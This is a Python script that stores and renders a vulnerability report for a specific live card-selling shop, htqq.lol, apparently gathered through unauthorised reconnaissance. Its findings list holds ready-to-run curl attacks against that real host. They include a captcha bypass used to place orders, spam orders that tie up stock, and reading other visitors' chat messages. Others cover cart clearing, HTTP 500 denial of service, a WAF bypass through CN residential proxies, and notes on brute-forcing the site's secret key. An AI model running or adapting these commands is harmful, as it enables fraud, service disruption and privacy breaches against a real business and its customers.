#!/usr/bin/env python3
"""将 htqq.lol 漏洞清单写入彩虹发卡 recon 库 (/data/recon/<domain>/rev/audit/)."""
from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path

TARGET = "https://htqq.lol/shop/"
DOMAIN = "htqq.lol"
TS = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

FINDINGS = [
    {
        "id": "H1",
        "severity": "HIGH",
        "category": "info_disclosure",
        "title": "getcount 未授权泄露经营数据",
        "detail": "orders=18043 money=5810471.4 site=674，无需登录",
        "endpoint": "GET /shop/ajax.php?act=getcount",
        "exploitable": True,
        "poc": 'curl -sk -H "X-Requested-With: XMLHttpRequest" -H "Referer: https://htqq.lol/shop/" "https://htqq.lol/shop/ajax.php?act=getcount"',
        "evidence": {
            "code": 0,
            "orders": "18059",
            "orders1": "18036",
            "orders2": "67",
            "money": 5813699.4,
            "money1": 18249,
            "site": "674",
            "cart_count": "0",
        },
        "ts": TS,
    },
    {
        "id": "H2",
        "severity": "HIGH",
        "category": "idor",
        "title": "order 卡密 IDOR（需 skey，kminfo 未抓到）",
        "detail": "POST ajax.php?act=order {id,skey} 可返回 kminfo；skey=md5(id+SYS_KEY+id)；10k+ SYS_KEY 字典×500 id 并行爆破无命中；真实卡密未导出",
        "endpoint": "POST /shop/ajax.php?act=order",
        "exploitable": False,
        "poc": 'curl -sk -X POST -H "Referer: https://htqq.lol/shop/?mod=query" -d "id=18059&skey=TEST" "https://htqq.lol/shop/ajax.php?act=order"',
        "evidence": {
            "response": "验证失败",
            "orders_total": "18059",
            "skey_formula": "md5(id+SYS_KEY+id)",
            "sys_key_brute": "10k+ candidates × 500 ids, no hit",
            "kminfo_captured": False,
            "csrf_whitelist": True,
        },
        "ts": TS,
    },
    {
        "id": "H3",
        "severity": "HIGH",
        "category": "crypto",
        "title": "hashsalt 前端 JSFuck 泄露（会话动态）",
        "detail": "buy 页 var hashsalt=JSFuck 每会话解码值不同，须同 PHPSESSID 绑定后 POST pay",
        "endpoint": "前端 faka.js buy 页",
        "exploitable": True,
        "poc": "见 htqq-deep-v9-breakthrough.md 同会话 pay PoC",
        "evidence": {
            "samples": [
                "b0750180cd456b7d6efc2217f10226dd",
                "0c9be44ab7c3da13edd13dd89efb0cdd",
            ],
            "note": "旧值 345a36b5... 已失效",
        },
        "ts": TS,
    },
    {
        "id": "H4",
        "severity": "HIGH",
        "category": "payment",
        "title": "支付回调接口公网暴露",
        "detail": "epay/alipay/wx/qq notify + submit + getshop 可达，签名伪造未成功",
        "endpoint": "/shop/other/*_notify.php, submit.php, getshop.php",
        "exploitable": False,
        "poc": 'curl -sk -X POST -d "trade_no=1&trade_status=TRADE_SUCCESS" "https://htqq.lol/shop/other/epay_notify.php"',
        "evidence": {"epay_notify": "error"},
        "ts": TS,
    },
    {
        "id": "H5",
        "severity": "HIGH",
        "category": "cron",
        "title": "cron.php 公网可访问",
        "detail": "返回「监控密钥不正确」，40+ 密钥字典未中",
        "endpoint": "GET /shop/cron.php",
        "exploitable": False,
        "poc": 'curl -sk "https://htqq.lol/shop/cron.php"',
        "evidence": {"response": "监控密钥不正确"},
        "ts": TS,
    },
    {
        "id": "H6",
        "severity": "HIGH",
        "category": "install",
        "title": "install 重装接管链",
        "detail": "install/ 可读，install.lock 可访问；删锁可重装",
        "endpoint": "/shop/install/, /shop/install/install.lock",
        "exploitable": False,
        "poc": 'curl -sk "https://htqq.lol/shop/install/index.php"',
        "evidence": {"message": "删除 install.lock 后再安装"},
        "ts": TS,
    },
    {
        "id": "H7",
        "severity": "HIGH",
        "category": "admin",
        "title": "sup 供货商后台暴露",
        "detail": "/shop/sup/ 含 fakalist 卡密库存，登录需 Geetest",
        "endpoint": "/shop/sup/login.php, fakalist.php",
        "exploitable": False,
        "poc": 'curl -sk "https://htqq.lol/shop/sup/login.php"',
        "evidence": {"paths": ["sup/login.php", "sup/fakalist.php", "sup/list.php"]},
        "ts": TS,
    },
    {
        "id": "H8",
        "severity": "MEDIUM",
        "category": "logic",
        "title": "gettoolnew cid 过滤失效",
        "detail": "任意 cid 返回相同 9 商品；gettool 正常 49 SKU",
        "endpoint": "GET /shop/ajax.php?act=gettoolnew&cid=*",
        "exploitable": True,
        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=gettoolnew&cid=1" -H "Referer: https://htqq.lol/shop/"',
        "evidence": {"note": "cid=1 与 cid=99 响应相同"},
        "ts": TS,
    },
    {
        "id": "H9",
        "severity": "HIGH",
        "category": "csrf",
        "title": "cart_empty 未授权清空购物车",
        "detail": "GET 无 CSRF；需同源 Referer（无 Referer 返回 403）；csrf.js 不拦截 GET",
        "endpoint": "GET /shop/ajax.php?act=cart_empty",
        "exploitable": True,
        "poc": 'curl -sk -H "Referer: https://htqq.lol/shop/?mod=cart" "https://htqq.lol/shop/ajax.php?act=cart_empty"',
        "evidence": {"with_referer": {"code": 0, "msg": "清空购物车成功！"}, "no_referer": {"code": 403}},
        "ts": TS,
    },
    {
        "id": "H10",
        "severity": "HIGH",
        "category": "dos",
        "title": "query 数字订单号触发 HTTP 500",
        "detail": "YYYYMMDDHHMMSS 格式触发 500 空 body，可 DoS query 接口",
        "endpoint": "POST /shop/ajax.php?act=query",
        "exploitable": True,
        "poc": 'curl -sk -X POST -H "Referer: https://htqq.lol/shop/?mod=query" -d "qq=20250713180000&type=1" "https://htqq.lol/shop/ajax.php?act=query"',
        "evidence": {"status": 500, "payload": "20250713180000"},
        "ts": TS,
    },
    {
        "id": "M1",
        "severity": "MEDIUM",
        "category": "info_disclosure",
        "title": "gettool/getclass 商品 API 全量泄露",
        "detail": "49 SKU + 9 分类无需登录",
        "endpoint": "GET /shop/ajax.php?act=gettool|getclass",
        "exploitable": True,
        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=gettool&cid=7" -H "Referer: https://htqq.lol/shop/"',
        "evidence": {"sku_count": 49, "class_count": 9},
        "ts": TS,
    },
    {
        "id": "M2",
        "severity": "MEDIUM",
        "category": "captcha",
        "title": "Geetest gt/challenge 泄露",
        "detail": "ajax.php?act=captcha 返回完整 Geetest 配置",
        "endpoint": "GET /shop/ajax.php?act=captcha",
        "exploitable": True,
        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=captcha" -H "Referer: https://htqq.lol/shop/"',
        "evidence": {"gt": "a1017fd4951689c5d20317c165c1c318"},
        "ts": TS,
    },
    {
        "id": "M3",
        "severity": "MEDIUM",
        "category": "session",
        "title": "ajax_chat session_id 泄露 + 全局共享会话",
        "detail": "act=get 无需登录；v10 确认所有匿名用户共享同一 session（如 id=17），session_id 参数无效，跨 Cookie 可读他人消息",
        "endpoint": "GET/POST /shop/user/ajax_chat.php?act=get|send",
        "exploitable": True,
        "poc": 'curl -sk -d "content=leak_test" "https://htqq.lol/shop/user/ajax_chat.php?act=send"; curl -sk "https://htqq.lol/shop/user/ajax_chat.php?act=get"',
        "evidence": {"shared_session_id": "17", "cross_cookie_read": True, "session_id_param_ignored": True},
        "ts": TS,
    },
    {
        "id": "M4",
        "severity": "MEDIUM",
        "category": "cart",
        "title": "cart_list/cart_info 未授权可读",
        "detail": "无需登录可读购物车列表（当前为空）",
        "endpoint": "GET /shop/ajax.php?act=cart_list|cart_info",
        "exploitable": True,
        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=cart_list" -H "Referer: https://htqq.lol/shop/?mod=cart"',
        "evidence": {"code": 0, "count": 0},
        "ts": TS,
    },
    {
        "id": "M5",
        "severity": "MEDIUM",
        "category": "cart",
        "title": "cart_shop_item/del IDOR 攻击面（未复现）",
        "detail": "id 1-500 全返回商品不存在；需真实 shop_id",
        "endpoint": "POST /shop/ajax.php?act=cart_shop_item|cart_shop_del",
        "exploitable": False,
        "poc": None,
        "evidence": {"scan_range": "1-500", "result": "商品不存在"},
        "ts": TS,
    },
    {
        "id": "M6",
        "severity": "INFO",
        "category": "waf",
        "title": "Cloudflare + _guard WAF",
        "detail": "高频扫描触发滑块/TLS reset；SQLi 关键字被 360 安全狗拦截",
        "endpoint": "/_guard/",
        "exploitable": False,
        "poc": None,
        "evidence": {"challenge": "Click to continue!"},
        "ts": TS,
    },
    {
        "id": "M7",
        "severity": "INFO",
        "category": "api",
        "title": "api.php IDOR 不适用（v7 确认封死）",
        "detail": "api.php 及 api.php/?act=search 直连/青果代理/HK 跳板均 TLS reset 或 HTTP 000；斜杠绕过无效",
        "endpoint": "GET /shop/api.php/?act=search&id=1",
        "exploitable": False,
        "poc": 'curl -sk "https://htqq.lol/shop/api.php/?act=search&id=1" -H "Referer: https://htqq.lol/shop/"',
        "evidence": {"v7_test": "connection_reset", "slash_bypass": False},
        "ts": TS,
    },
    {
        "id": "M8",
        "severity": "LOW",
        "category": "info_disclosure",
        "title": "getleftcount 库存泄露",
        "detail": "tid=6 返回 count=1；tid=2 API 返回 0 但 buy 页 leftcount=50（数据不一致）",
        "endpoint": "GET /shop/ajax.php?act=getleftcount&tid=*",
        "exploitable": True,
        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=getleftcount&tid=2" -H "Referer: https://htqq.lol/shop/"',
        "evidence": {"api_tid2": "0", "html_leftcount_tid2": "50"},
        "ts": TS,
    },
    {
        "id": "H11",
        "severity": "HIGH",
        "category": "captcha_bypass",
        "title": "Geetest 下单验证码绕过",
        "detail": "同会话 buy 页取动态 hashsalt+csrf，POST pay 无 paytype/geetest 直接 code=0 提交订单成功",
        "endpoint": "POST /shop/ajax.php?act=pay",
        "exploitable": True,
        "poc": "见 automation-setup/htqq-deep-v9-breakthrough.md §2.2",
        "evidence": {
            "trade_no": "20260713145905128",
            "code": 0,
            "msg": "提交订单成功！",
            "geetest_bypassed": True,
        },
        "ts": TS,
    },
    {
        "id": "H12",
        "severity": "HIGH",
        "category": "abuse",
        "title": "未付款订单滥建（无速率限制）",
        "detail": "利用 H11 可连续创建多笔未付款订单，占用 tid 库存，getshop 返回未付款",
        "endpoint": "POST /shop/ajax.php?act=pay",
        "exploitable": True,
        "poc": None,
        "evidence": {
            "spam_trade_nos": [
                "20260713150016492",
                "20260713150017837",
                "20260713150019392",
            ],
            "rate_limit": False,
        },
        "ts": TS,
    },
    {
        "id": "M9",
        "severity": "MEDIUM",
        "category": "info_disclosure",
        "title": "首页 HTML 全量商品/库存泄露",
        "detail": "49 个 tid 及价格直接在首页 HTML，无需 API",
        "endpoint": "GET /shop/",
        "exploitable": True,
        "poc": 'curl -sk -H "Accept-Language: zh-CN" "https://htqq.lol/shop/"',
        "evidence": {"tid_count": 49},
        "ts": TS,
    },
    {
        "id": "M10",
        "severity": "LOW",
        "category": "cookie",
        "title": "PHPSESSID 缺少 Secure/HttpOnly",
        "detail": "mysid 有 HttpOnly+Secure，PHPSESSID 均无",
        "endpoint": "GET /shop/ Set-Cookie",
        "exploitable": False,
        "poc": None,
        "evidence": {"PHPSESSID": "no Secure/HttpOnly", "mysid": "HttpOnly+Secure"},
        "ts": TS,
    },
    {
        "id": "M11",
        "severity": "INFO",
        "category": "waf_bypass",
        "title": "_guard WAF 语言头+CN 代理绕过",
        "detail": "Accept-Language: zh-CN + 青果 CN 住宅代理可绕过滑块访问 buy/cart/query",
        "endpoint": "/shop/*",
        "exploitable": True,
        "poc": 'curl -sk -H "Accept-Language: zh-CN,zh;q=0.9" -x "$PROXY_URL" "https://htqq.lol/shop/?mod=buy&cid=2&tid=2"',
        "evidence": {"hk_direct": "000", "cn_zh_cn": "200"},
        "ts": TS,
    },
    {
        "id": "H13",
        "severity": "HIGH",
        "category": "idor",
        "title": "ajax_chat 全局共享会话（跨用户读消息）",
        "detail": "匿名访客共享同一 chat session；独立 Cookie 会话 A 发的消息 B 立即可读；session_id 参数无法隔离",
        "endpoint": "GET /shop/user/ajax_chat.php?act=get",
        "exploitable": True,
        "poc": "见 automation-setup/htqq-deep-v10-alt-vectors.md §1",
        "evidence": {
            "session_id": "17",
            "cross_cookie_leak": True,
            "sample_message": "ISOLATION_TEST_1783927588",
        },
        "ts": TS,
    },
    {
        "id": "H14",
        "severity": "MEDIUM",
        "category": "abuse",
        "title": "ajax_chat 未授权发送消息",
        "detail": "POST act=send 无需登录；约 6 条后禁言 3 分钟；可用于客服通道骚扰/钓鱼",
        "endpoint": "POST /shop/user/ajax_chat.php?act=send",
        "exploitable": True,
        "poc": 'curl -sk -d "content=spam_test" "https://htqq.lol/shop/user/ajax_chat.php?act=send"',
        "evidence": {"code": 0, "msg": "发送成功", "rate_limit_after": 6, "ban_minutes": 3},
        "ts": TS,
    },
    {
        "id": "M12",
        "severity": "LOW",
        "category": "info_disclosure",
        "title": "ajax_chat 禁言提示模板变量未渲染",
        "detail": "超速禁言返回 msg 含字面量 {$remaining_text}",
        "endpoint": "POST /shop/user/ajax_chat.php?act=send",
        "exploitable": False,
        "poc": None,
        "evidence": {"msg": "您已被禁言，剩余时间：{$remaining_text}"},
        "ts": TS,
    },
    {
        "id": "H15",
        "severity": "HIGH",
        "category": "crypto",
        "title": "skey 算法逆向确认（彩虹 ajax.php 同源）",
        "detail": "query 返回 skey=md5(id.SYS_KEY.id)；order/changepwd/fill 均用同式校验；已知公式但 SYS_KEY 在 config.php(403) 不可读",
        "endpoint": "POST /shop/ajax.php?act=query|order",
        "exploitable": False,
        "poc": "见 wc7086/caihongzizhuxiadanxitong ajax.php case query/order",
        "evidence": {
            "formula": "md5(str(id)+SYS_KEY+str(id))",
            "source": "github.com/wc7086/caihongzizhuxiadanxitong",
            "config_php": "403",
        },
        "ts": TS,
    },
    {
        "id": "H16",
        "severity": "HIGH",
        "category": "availability",
        "title": "ajax act=query 全量 HTTP 500（skey 主链阻断）",
        "detail": "HK 直连/CN 代理/workspace 均 type=0/1/2 空体或 500；17 位 tradeno IDOR 无法经 JSON 取 skey",
        "endpoint": "POST /shop/ajax.php?act=query",
        "exploitable": False,
        "poc": 'curl -sk -X POST -H "Referer: https://htqq.lol/shop/?mod=query" -d "type=1&qq=20260713175820825" "https://htqq.lol/shop/ajax.php?act=query" -w "%{http_code}"',
        "evidence": {"http_code": 500, "body": "empty", "all_types_fail": True},
        "ts": TS,
    },
    {
        "id": "H17",
        "severity": "HIGH",
        "category": "idor",
        "title": "query 页 HTML 可泄露 skey（需命中联系方式/tradeno）",
        "detail": "mod=query&data= 服务端渲染 showOrder(id,skey)；402 常见联系方式+今日 tradeno 模式扫描 0 命中；queryorderlimit 可能限制 tradeno 跨会话",
        "endpoint": "GET /shop/?mod=query&data=",
        "exploitable": False,
        "poc": 'curl -sk -H "Accept-Language: zh-CN" "https://htqq.lol/shop/?mod=query&data=123456"',
        "evidence": {
            "template": "template/faka/query.php showOrder(id,skey)",
            "contact_scan": "402 candidates, 0 showOrder",
            "tradeno_scan": "3000+ today patterns, 0 hit",
            "kminfo_captured": False,
        },
        "ts": TS,
    },
    {
        "id": "H18",
        "severity": "MEDIUM",
        "category": "logic",
        "title": "mod=faka 提卡页 skey 门控（验证失败）",
        "detail": "?mod=faka&id=&skey= 错误 skey 弹窗验证失败；与 order act 同算法；无 skey 绕过",
        "endpoint": "GET /shop/?mod=faka&id=&skey=",
        "exploitable": False,
        "poc": 'curl -sk "https://htqq.lol/shop/?mod=faka&id=18000&skey=00000000000000000000000000000000"',
        "evidence": {"alert": "验证失败"},
        "ts": TS,
    },
]


def count_severity(findings: list[dict]) -> dict[str, int]:
    c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        sev = f.get("severity", "INFO")
        c[sev] = c.get(sev, 0) + 1
    return c


def render_report_md(report: dict) -> str:
    lines = [
        f"# {DOMAIN} 彩虹发卡漏洞报告",
        "",
        f"- Target: {TARGET}",
        f"- Updated: {report['ts']}",
        f"- Orders: {report['orders']} | Subsites: {report['subsites']}",
        f"- Findings: {report['findings_count']} "
        f"(CRITICAL: {report['critical']}, HIGH: {report['high']}, MEDIUM: {report['medium']})",
        "",
        "## 漏洞汇总",
        "",
        "| ID | 等级 | 漏洞 | 可利用 |",
        "|----|------|------|--------|",
    ]
    for f in report["findings"]:
        exp = "✅" if f.get("exploitable") else "⚠️"
        lines.append(f"| {f.get('id','')} | {f['severity']} | {f['title']} | {exp} |")
    lines.append("")
    for f in report["findings"]:
        lines.extend([
            f"## [{f['severity']}] {f.get('id', '')} {f['title']}",
            "",
            f"- **端点:** `{f.get('endpoint', '')}`",
            f"- **详情:** {f['detail']}",
            f"- **可利用:** {'是' if f.get('exploitable') else '否/待突破'}",
        ])
        if f.get("poc"):
            lines.extend(["", "```bash", f["poc"], "```"])
        lines.append("")
    return "\n".join(lines)


def main() -> None:
    import argparse

    ap = argparse.ArgumentParser(description="保存漏洞到彩虹 recon 库")
    ap.add_argument(
        "--out",
        default=f"/data/recon/{DOMAIN}/rev/audit",
        help="输出目录 (默认 /data/recon/htqq.lol/rev/audit)",
    )
    args = ap.parse_args()
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    orders = int(FINDINGS[0]["evidence"].get("orders", 0))
    subsites = int(FINDINGS[0]["evidence"].get("site", 0))
    counts = count_severity(FINDINGS)

    report = {
        "target": TARGET,
        "domain": DOMAIN,
        "framework": "独角/彩虹发卡",
        "ts": TS,
        "orders": orders,
        "subsites": subsites,
        "findings_count": len(FINDINGS),
        "critical": counts["CRITICAL"],
        "high": counts["HIGH"],
        "medium": counts["MEDIUM"],
        "low": counts["LOW"],
        "info": counts["INFO"],
        "exploitable_count": sum(1 for f in FINDINGS if f.get("exploitable")),
        "findings": FINDINGS,
    }

    (out / "findings.json").write_text(
        json.dumps(FINDINGS, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    (out / "REPORT.json").write_text(
        json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    (out / "REPORT.md").write_text(render_report_md(report), encoding="utf-8")
    (out / "FULL_VULN_REPORT.md").write_text(render_report_md(report), encoding="utf-8")

    reports_dir = out.parent.parent / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    (reports_dir / "VULN_REPORT.md").write_text(render_report_md(report), encoding="utf-8")

    print(f"saved {len(FINDINGS)} findings -> {out}")
    print(f"  findings.json, REPORT.json, REPORT.md, FULL_VULN_REPORT.md")
    print(f"  reports/VULN_REPORT.md")


if __name__ == "__main__":
    main()
